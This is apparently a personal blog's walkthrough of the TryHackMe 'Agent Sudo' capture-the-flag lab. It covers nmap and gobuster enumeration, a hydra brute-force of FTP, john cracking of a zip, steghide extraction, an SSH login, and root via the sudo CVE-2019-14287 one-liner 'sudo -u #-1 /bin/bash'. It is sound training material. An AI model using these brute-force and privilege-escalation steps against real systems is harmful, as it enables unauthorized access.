---
title: TryHackMe - Agent Sudo
author: Bonface
date: 2024-10-31 00:00:00 +0000
categories: [TryHackMe]
tags: [tryhackme, linux, web, privesc, bruteforce, hydra, suid, john, crack, gobuster]
---

# Agent Sudo

You found a secret server located under the deep sea.  
Your task is to hack inside the server and reveal the truth.

### Task 2: Enumerate
### Task 3: Hash cracking and brute-force
### Task 4: Capture the user flag  
### Task 5: Privilege escalation



## Enumerate
### nmap

```sh 
nmap -sV -sC -v 10.10.224.246
```

```sh
Scanning 10.10.224.246 [1000 ports]
Discovered open port 22/tcp on 10.10.224.246
Discovered open port 21/tcp on 10.10.224.246
Discovered open port 80/tcp on 10.10.224.246

21/tcp  open     ftp            vsftpd 3.0.3

22/tcp  open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)

80/tcp  open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

902/tcp filtered iss-realsecure

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### Http_80

 **ip**  `10.10.55.182`

**To Do List**  
- run gobuster
- surf the web  
- view source code  
- robots.txt  
- gobuster  

```sh
gobuster dir -u http://10.10.55.182 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
### Result
Nothing much 

### surf the web

![](/assets/img/Agent_sudo/1.png)

Let's try spoofing as C and get the same URL with curl.  
-A allows us to spoof the user agent and -L follows any redirects.

![](/assets/img/Agent_sudo/2.png)

Now we have a user `chris` but not sure it's for ssh or ftp.

### ftp-21

## bruteforce
```sh
hydra -L users.txt -P passwords.txt <IP> ftp 
# hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.55.182 ftp
```

![](/assets/img/Agent_sudo/3.png)

## Result
ftp details  
- user name: chris  
- password: crystal  
log in!!!
```sh
ftp chris@10.10.55.182 
```

![](/assets/img/Agent_sudo/4.png)


we got the file, concatenate it:  
![](/assets/img/Agent_sudo/5.png)


Will have to go back and get the images. We run binwalk on the png file which is the most likely to contain some hidden files.

We get these three files:
i
- 365  
- 365.zlib  
- 8702.zip  
- To_agentR.txt  

The zip file is encrypted. We can use john to crack the password:

```sh
zip2john 8702.zip > forjohn
john forjohn.txt
```

![](/assets/img/Agent_sudo/6.png)

Password = alien  
Unzip the files. 
 
You may get errors extracting the files using unzip, if so, use 7z e `zipfile`
```sh
 7z e 8702.zip
 ```  

Use `CyberChef` to decode  
`QXJlYTUx` = `Area51` = password for `steg`.  
We can now use `steghide` on the image that we never used.
```sh
steghide info cute-alien.jpg 
steghide extract -sf cute-alien.jpg 
cat message.txt
```

![](/assets/img/Agent_sudo/10.png)


### Details
With these details and the unused port (22 = ssh), we can try logging in.

Details 
- username: `james`
- password: `hackerrules!`

```sh
 ssh james@10.10.55.182 
# password = hackerrules!
```
![](/assets/img/Agent_sudo/7.png)

## Privilege escalation
Run sudo -l  
![](/assets/img/Agent_sudo/8.png)

Google search for the exploit: CVE:2019-14287  
In the exploit page, we get:  
```sh
 'sudo -u #-1 /bin/bash'
 #Read the root flag. 
```
![](/assets/img/Agent_sudo/9.png)
